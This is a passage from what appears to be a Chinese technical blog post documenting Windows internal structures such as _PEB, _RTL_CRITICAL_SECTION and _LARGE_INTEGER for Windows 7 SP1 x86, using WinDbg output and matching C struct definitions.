class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt _CURDIR</span><br><span class="line">ntdll!_CURDIR</span><br><span class="line">   +<span class="number">0x000</span> DosPath          : _UNICODE_STRING</span><br><span class="line">   +<span class="number">0x008</span> Handle           : Ptr32 Void</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0xc bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">CURDIR</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> <span class="title">DosPath</span>;</span>    <span class="comment">//0x0</span></span><br><span class="line">    VOID* Handle;                      <span class="comment">//0x8</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt _RTL_DRIVE_LETTER_CURDIR</span><br><span class="line">ntdll!_RTL_DRIVE_LETTER_CURDIR</span><br><span class="line">   +<span class="number">0x000</span> Flags            : Uint2B</span><br><span class="line">   +<span class="number">0x002</span> Length           : Uint2B</span><br><span class="line">   +<span class="number">0x004</span> TimeStamp        : Uint4B</span><br><span class="line">   +<span class="number">0x008</span> DosPath          : _STRING</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x10 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">RTL_DRIVE_LETTER_CURDIR</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    USHORT Flags;                      <span class="comment">//0x0</span></span><br><span class="line">    USHORT Length;                     <span class="comment">//0x2</span></span><br><span class="line">    ULONG TimeStamp;                   <span class="comment">//0x4</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">STRING</span> <span class="title">DosPath</span>;</span>            <span class="comment">//0x8</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="RTL-CRITICAL-SECTION"><a href="#RTL-CRITICAL-SECTION" class="headerlink" title="_RTL_CRITICAL_SECTION"></a>_RTL_CRITICAL_SECTION</h4><p><a href="https://www.geek-share.com/detail/2620533378.html" target="_blank" rel="noopener">ReactOS分析CriticalSection</a><br>RtlInitializeCriticalSection<br>RtlInitializeCriticalSectionAndSpinCount<br>RtlSetCriticalSectionSpinCount<br>RtlpCreateCriticalSectionSem<br>RtlpWaitForCriticalSection<br>RtlEnterCriticalSection<br>RtlLeaveCriticalSection<br>RtlDeleteCriticalSection</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt _RTL_CRITICAL_SECTION</span><br><span class="line">ntdll!_RTL_CRITICAL_SECTION</span><br><span class="line">   +<span class="number">0x000</span> DebugInfo        : Ptr32 _RTL_CRITICAL_SECTION_DEBUG</span><br><span class="line">   +<span class="number">0x004</span> LockCount        : Int4B</span><br><span class="line">   +<span class="number">0x008</span> RecursionCount   : Int4B</span><br><span class="line">   +<span class="number">0x00c</span> OwningThread     : Ptr32 Void</span><br><span class="line">   +<span class="number">0x010</span> LockSemaphore    : Ptr32 Void</span><br><span class="line">   +<span class="number">0x014</span> SpinCount        : Uint4B</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x18 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">RTL_CRITICAL_SECTION</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">RTL_CRITICAL_SECTION_DEBUG</span>* <span class="title">DebugInfo</span>;</span>      <span class="comment">//0x0</span></span><br><span class="line">    LONG LockCount;                                     <span class="comment">//0x4</span></span><br><span class="line">    LONG RecursionCount;                                <span class="comment">//0x8</span></span><br><span class="line">    VOID* OwningThread;                                 <span class="comment">//0xc</span></span><br><span class="line">    VOID* LockSemaphore;                                <span class="comment">//0x10</span></span><br><span class="line">    ULONG SpinCount;                                    <span class="comment">//0x14</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt _RTL_CRITICAL_SECTION_DEBUG</span><br><span class="line">ntdll!_RTL_CRITICAL_SECTION_DEBUG</span><br><span class="line">   +<span class="number">0x000</span> Type             : Uint2B</span><br><span class="line">   +<span class="number">0x002</span> CreatorBackTraceIndex : Uint2B</span><br><span class="line">   +<span class="number">0x004</span> CriticalSection  : Ptr32 _RTL_CRITICAL_SECTION</span><br><span class="line">   +<span class="number">0x008</span> ProcessLocksList : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x010</span> EntryCount       : Uint4B</span><br><span class="line">   +<span class="number">0x014</span> ContentionCount  : Uint4B</span><br><span class="line">   +<span class="number">0x018</span> Spare            : [<span class="number">2</span>] Uint4B</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x20 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">RTL_CRITICAL_SECTION_DEBUG</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    USHORT Type;                                        <span class="comment">//0x0</span></span><br><span class="line">    USHORT CreatorBackTraceIndex;                       <span class="comment">//0x2</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">RTL_CRITICAL_SECTION</span>* <span class="title">CriticalSection</span>;</span>      <span class="comment">//0x4</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">ProcessLocksList</span>;</span>                <span class="comment">//0x8</span></span><br><span class="line">    ULONG EntryCount;                                   <span class="comment">//0x10</span></span><br><span class="line">    ULONG ContentionCount;                              <span class="comment">//0x14</span></span><br><span class="line">    ULONG Spare[<span class="number">2</span>];                                     <span class="comment">//0x18</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="PEB-FREE-BLOCK"><a href="#PEB-FREE-BLOCK" class="headerlink" title="_PEB_FREE_BLOCK"></a>_PEB_FREE_BLOCK</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt _PEB_FREE_BLOCK</span><br><span class="line">ntdll!_PEB_FREE_BLOCK</span><br><span class="line">   +<span class="number">0x000</span> Next             : Ptr32 _PEB_FREE_BLOCK</span><br><span class="line">   +<span class="number">0x004</span> Size             : Uint4B</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x8 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">PEB_FREE_BLOCK</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">PEB_FREE_BLOCK</span>* <span class="title">Next</span>;</span>                                           <span class="comment">//0x0</span></span><br><span class="line">    ULONG Size;                                                             <span class="comment">//0x4</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="LARGE-INTEGER"><a href="#LARGE-INTEGER" class="headerlink" title="_LARGE_INTEGER"></a>_LARGE_INTEGER</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt _LARGE_INTEGER</span><br><span class="line">ntdll!_LARGE_INTEGER</span><br><span class="line">   +<span class="number">0x000</span> LowPart          : Uint4B</span><br><span class="line">   +<span class="number">0x004</span> HighPart         : Int4B</span><br><span class="line">   +<span class="number">0x000</span> u                : __unnamed</span><br><span class="line">   +<span class="number">0x000</span> QuadPart         : Int8B</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x8 bytes (sizeof)</span></span><br><span class="line"><span class="keyword">union</span> _LARGE_INTEGER</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        ULONG LowPart;                                                      <span class="comment">//0x0</span></span><br><span class="line">        LONG HighPart;                                                      <span class="comment">//0x4</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        ULONG LowPart;                                                      <span class="comment">//0x0</span></span><br><span class="line">        LONG HighPart;                                                      <span class="comment">//0x4</span></span><br><span class="line">    &#125; u;                                                                    <span class="comment">//0x0</span></span><br><span class="line">    LONGLONG QuadPart;                                                      <span class="comment">//0x0</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="ULARGE-INTEGER"><a href="#ULARGE-INTEGER" class="headerlink" title="_ULARGE_INTEGER"></a>_ULARGE_INTEGER</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt _ULARGE_INTEGER</span><br><span class="line">ntdll!_ULARGE_INTEGER</span><br><span class="line">   +<span class="number">0x000</span> LowPart          : Uint4B</span><br><span class="line">   +<span class="number">0x004</span> HighPart         : Uint4B</span><br><span class="line">   +<span class="number">0x000</span> u                : __unnamed</span><br><span class="line">   +<span class="number">0x000</span> QuadPart         : Uint8B</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x8 bytes (sizeof)</span></span><br><span class="line"><span class="keyword">union</span> _ULARGE_INTEGER</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        ULONG LowPart;                                                      <span class="comment">//0x0</span></span><br><span class="line">        ULONG HighPart;                                                     <span class="comment">//0x4</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        ULONG LowPart;                                                      <span class="comment">//0x0</span></span><br><span class="line">        ULONG HighPart;                                                     <span class="comment">//0x4</span></span><br><span class="line">    &#125; u;                                                                    <span class="comment">//0x0</span></span><br><span class="line">    ULONGLONG QuadPart;                                                     <span class="comment">//0x0</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="UNICODE-STRING-2"><a href="#UNICODE-STRING-2" class="headerlink" title="_UNICODE_STRING"></a>_UNICODE_STRING</h4><p>&emsp;&emsp;见上方。</p><h3 id="Windows-7-SP1-x86-1"><a href="#Windows-7-SP1-x86-1" class="headerlink" title="Windows 7 SP1 x86"></a>Windows 7 SP1 x86</h3><h4 id="PEB-4"><a href="#PEB-4" class="headerlink" title="_PEB"></a>_PEB</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">001</span>&gt; dt ntdll!_PEB</span><br><span class="line">   +<span class="number">0x000</span> InheritedAddressSpace : UChar</span><br><span class="line">   +<span class="number">0x001</span> ReadImageFileExecOptions : UChar</span><br><span class="line">   +<span class="number">0x002</span> BeingDebugged    : UChar</span><br><span class="line">   +<span class="number">0x003</span> BitField         : UChar</span><br><span class="line">   +<span class="number">0x003</span> ImageUsesLargePages : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x003</span> IsProtectedProcess : Pos <span class="number">1</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x003</span> IsLegacyProcess  : Pos <span class="number">2</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x003</span> IsImageDynamicallyRelocated : Pos <span class="number">3</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x003</span> SkipPatchingUser32Forwarders : Pos <span class="number">4</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x003</span> SpareBits        : Pos <span class="number">5</span>, <span class="number">3</span> Bits</span><br><span class="line">   +<span class="number">0x004</span> Mutant           : Ptr32 Void</span><br><span class="line">   +<span class="number">0x008</span> ImageBaseAddress : Ptr32 Void</span><br><span class="line">   +<span class="number">0x00c</span> Ldr              : Ptr32 _PEB_LDR_DATA</span><br><span class="line">   +<span class="number">0x010</span> ProcessParameters : Ptr32 _RTL_USER_PROCESS_PARAMETERS</span><br><span class="line">   +<span class="number">0x014</span> SubSystemData    : Ptr32 Void</span><br><span class="line">   +<span class="number">0x018</span> ProcessHeap      : Ptr32 Void</span><br><span class="line">   +<span class="number">0x01c</span> FastPebLock      : Ptr32 _RTL_CRITICAL_SECTION</span><br><span class="line">   +<span class="number">0x020</span> AtlThunkSListPtr : Ptr32 Void</span><br><span class="line">   +<span class="number">0x024</span> IFEOKey          : Ptr32 Void</span><br><span class="line">   +<span class="number">0x028</span> CrossProcessFlags : Uint4B</span><br><span class="line">   +<span class="number">0x028</span> ProcessInJob     : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x028</span> ProcessInitializing : Pos <span class="number">1</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x028</span> ProcessUsingVEH  : Pos <span class="number">2</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x028</span> ProcessUsingVCH  : Pos <span class="number">3</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x028</span> ProcessUsingFTH  : Pos <span class="number">4</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x028</span> ReservedBits0    : Pos <span class="number">5</span>, <span class="number">27</span> Bits</span><br><span class="line">   +<span class="number">0x02c</span> KernelCallbackTable : Ptr32 Void</span><br><span class="line">   +<span class="number">0x02c</span> UserSharedInfoPtr : Ptr32 Void</span><br><span class="line">   +<span class="number">0x030</span> SystemReserved   : [<span class="number">1</span>] Uint4B</span><br><span class="line">   +<span class="number">0x034</span> AtlThunkSListPtr32 : Uint4B</span><br><span class="line">   +<span class="number">0x038</span> ApiSetMap        : Ptr32 Void</span><br><span class="line">   +<span class="number">0x03c</span> TlsExpansionCounter : Uint4B</span><br><span class="line">   +<span class="number">0x040</span> TlsBitmap        : Ptr32 Void</span><br><span class="line">   +<span class="number">0x044</span> TlsBitmapBits    : [<span class="number">2</span>] Uint4B</span><br><span class="line">   +<span class="number">0x04c</span> ReadOnlySharedMemoryBase : Ptr32 Void</span><br><span class="line">   +<span class="number">0x050</span> HotpatchInformation : Ptr32 Void</span><br><span class="line">   +<span class="number">0x054</span> ReadOnlyStaticServerData : Ptr32 Ptr32 Void</span><br><span class="line">   +<span class="number">0x058</span> AnsiCodePageData : Ptr32 Void</span><br><span class="line">   +<span class="number">0x05c</span> OemCodePageData  : Ptr32 Void</span><br><span class="line">   +<span class="number">0x060</span> UnicodeCaseTableData : Ptr32 Void</span><br><span class="line">   +<span class="number">0x064</span> NumberOfProcessors : Uint4B</span><br><span class="line">   +<span class="number">0x068</span> NtGlobalFlag     : Uint4B</span><br><span class="line">   +<span class="number">0x070</span> CriticalSectionTimeout : _LARGE_INTEGER</span><br><span class="line">   +<span class="number">0x078</span> HeapSegmentReserve : Uint4B</span><br><span class="line">   +<span class="number">0x07c</span> HeapSegmentCommit : Uint4B</span><br><span class="line">   +<span class="number">0x080</span> HeapDeCommitTotalFreeThreshold : Uint4B</span><br><span class="line">   +<span class="number">0x084</span> HeapDeCommitFreeBlockThreshold : Uint4B</span><br><span class="line">   +<span class="number">0x088</span> NumberOfHeaps    : Uint4B</span><br><span class="line">   +<span class="number">0x08c</span> MaximumNumberOfHeaps : Uint4B</span><br><span class="line">   +<span class="number">0x090</span> ProcessHeaps     : Ptr32 Ptr32 Void</span><br><span class="line">   +<span class="number">0x094</span> GdiSharedHandleTable : Ptr32 Void</span><br><span class="line">   +<span class="number">0x098</span> ProcessStarterHelper : Ptr32 Void</span><br><span class="line">   +<span class="number">0x09c</span> GdiDCAttributeList : Uint4B</span><br><span class="line">   +<span class="number">0x0a0</span> LoaderLock       : Ptr32 _RTL_CRITICAL_SECTION</span><br><span class="line">   +<span class="number">0x0a4</span> OSMajorVersion   : Uint4B</span><br><span class="line">   +<span class="number">0x0a8</span> OSMinorVersion   : Uint4B</span><br><span class="line">   +<span class="number">0x0ac</span> OSBuildNumber    : Uint2B</span><br><span class="line">   +<span class="number">0x0ae</span> OSCSDVersion     : Uint2B</span><br><span class="line">   +<span class="number">0x0b0</span> OSPlatformId     : Uint4B</span><br><span class="line">   +<span class="number">0x0b4</span> ImageSubsystem   : Uint4B</span><br><span class="line">   +<span class="number">0x0b8</span> ImageSubsystemMajorVersion : Uint4B</span><br><span class="line">   +<span class="number">0x0bc</span> ImageSubsystemMinorVersion : Uint4B</span><br><span class="line">   +<span class="number">0x0c0</span> ActiveProcessAffinityMask : Uint4B</span><br><span class="line">   +<span class="number">0x0c4</span> GdiHandleBuffer  : [<span class="number">34</span>] Uint4B</span><br><span class="line">   +<span class="number">0x14c</span> PostProcessInitRoutine : Ptr32     <span class="keyword">void</span> </span><br><span class="line">   +<span class="number">0x150</span> TlsExpansionBitmap : Ptr32 Void</span><br><span class="line">   +<span class="number">0x154</span> TlsExpansionBitmapBits : [<span class="number">32</span>] Uint4B</span><br><span class="line">   +<span class="number">0x1d4</span> SessionId        : Uint4B</span><br><span class="line">   +<span class="number">0x1d8</span> AppCompatFlags   : _ULARGE_INTEGER</span><br><span class="line">   +<span class="number">0x1e0</span> AppCompatFlagsUser : _ULARGE_INTEGER</span><br><span class="line">   +<span class="number">0x1e8</span> pShimData        : Ptr32 Void</span><br><span class="line">   +<span class="number">0x1ec</span> AppCompatInfo    : Ptr32 Void</span><br><span class="line">   +<span class="number">0x1f0</span> CSDVersion       : _UNICODE_STRING</span><br><span class="line">   +<span class="number">0x1f8</span> ActivationContextData : Ptr32 _ACTIVATION_CONTEXT_DATA</span><br><span class="line">   +<span class="number">0x1fc</span> ProcessAssemblyStorageMap : Ptr32 _ASSEMBLY_STORAGE_MAP</span><br><span class="line">   +<span class="number">0x200</span> SystemDefaultActivationContextData : Ptr32 _ACTIVATION_CONTEXT_DATA</span><br><span class="line">   +<span class="number">0x204</span> SystemAssemblyStorageMap : Ptr32 _ASSEMBLY_STORAGE_MAP</span><br><span class="line">   +<span class="number">0x208</span> MinimumStackCommit : Uint4B</span><br><span class="line">   +<span class="number">0x20c</span> FlsCallback      : Ptr32 _FLS_CALLBACK_INFO</span><br><span class="line">   +<span class="number">0x210</span> FlsListHead      : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x218</span> FlsBitmap        : Ptr32 Void</span><br><span class="line">   +<span class="number">0x21c</span> FlsBitmapBits    : [<span class="number">4</span>] Uint4B</span><br><span class="line">   +<span class="number">0x22c</span> FlsHighIndex     : Uint4B</span><br><span class="line">   +<span class="number">0x230</span> WerRegistrationData : Ptr32 Void</span><br><span class="line">   +<span class="number">0x234</span> WerShipAssertPtr : Ptr32 Void</span><br><span class="line">   +<span class="number">0x238</span> pContextData     : Ptr32 Void</span><br><span class="line">   +<span class="number">0x23c</span> pImageHeaderHash : Ptr32 Void</span><br><span class="line">   +<span class="number">0x240</span> TracingFlags     : Uint4B</span><br><span class="line">   +<span class="number">0x240</span> HeapTracingEnabled : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x240</span> CritSecTracingEnabled : Pos <span class="number">1</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x240</span> SpareTracingBits : Pos <span class="number">2</span>, <span class="number">30</span> Bits</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x248 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">PEB</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    UCHAR InheritedAddressSpace;                                            <span class="comment">//0x0</span></span><br><span class="line">    UCHAR ReadImageFileExecOptions;                                         <span class="comment">//0x1</span></span><br><span class="line">    UCHAR BeingDebugged;                                                    <span class="comment">//0x2</span></span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">        UCHAR BitField;                                                     <span class="comment">//0x3</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            UCHAR ImageUsesLargePages:<span class="number">1</span>;                                    <span class="comment">//0x3</span></span><br><span class="line">            UCHAR IsProtectedProcess:<span class="number">1</span>;                                     <span class="comment">//0x3</span></span><br><span class="line">            UCHAR IsLegacyProcess:<span class="number">1</span>;                                        <span class="comment">//0x3</span></span><br><span class="line">            UCHAR IsImageDynamicallyRelocated:<span class="number">1</span>;                            <span class="comment">//0x3</span></span><br><span class="line">            UCHAR SkipPatchingUser32Forwarders:<span class="number">1</span>;                           <span class="comment">//0x3</span></span><br><span class="line">            UCHAR SpareBits:<span class="number">3</span>;                                              <span class="comment">//0x3</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    VOID* Mutant;                                                           <span class="comment">//0x4</span></span><br><span class="line">    VOID* ImageBaseAddress;                                                 <span class="comment">//0x8</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">PEB_LDR_DATA</span>* <span class="title">Ldr</span>;</span>                                              <span class="comment">//0xc</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">RTL_USER_PROCESS_PARAMETERS</span>* <span class="title">ProcessParameters</span>;</span>                 <span class="comment">//0x10</span></span><br><span class="line">    VOID* SubSystemData;                                                    <span class="comment">//0x14</span></span><br><span class="line">    VOID* ProcessHeap;                                                      <span class="comment">//0x18</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">RTL_CRITICAL_SECTION</span>* <span class="title">FastPebLock</span>;</span>                              <span class="comment">//0x1c</span></span><br><span class="line">    VOID* AtlThunkSListPtr;                                                 <span class="comment">//0x20</span></span><br><span class="line">    VOID* IFEOKey;                                                          <span class="comment">//0x24</span></span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">        ULONG 